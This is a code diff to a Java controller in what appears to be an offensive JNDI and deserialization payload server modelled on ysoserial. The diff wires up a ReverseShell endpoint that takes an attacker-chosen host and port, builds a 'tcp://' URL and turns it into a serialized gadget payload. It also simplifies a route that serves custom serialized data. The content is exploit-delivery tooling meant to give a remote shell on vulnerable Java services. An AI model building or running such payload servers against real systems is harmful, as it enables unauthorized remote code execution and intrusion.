@@ -1,5 +1,6 @@
 package com.h2tg.ysogate.controller;
 
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.payloads.CommandObjectPayload.Utils;
 import com.h2tg.ysogate.annotation.JNDIController;
 import com.h2tg.ysogate.annotation.JNDIMapping;
@@ -16,7 +17,7 @@ public class DeserializeController implements Controller {
         return obj;
     }
 
-    @JNDIMapping("/{gadget}/Custom/{data}")
+    @JNDIMapping("/Custom/{data}")
     public byte[] custom(String data) throws IOException
     {
         System.out.println("[Deserialize] Load custom serialized data");
@@ -50,7 +51,8 @@ public class DeserializeController implements Controller {
     @JNDIMapping("/{gadget}/ReverseShell/{host}/{port}")
     public byte[] GadgetReverseShell(String gadget,String host, String port) throws Exception {
         System.out.println("[ReverseShell]: Host: " + host + " Port: " + port);
-        Object obj = null;
+        String url = "tcp://"+ host + ":" + port;
+        Object obj = Utils.makePayloadObject(gadget, url);
         return serialize(obj);
     }
 
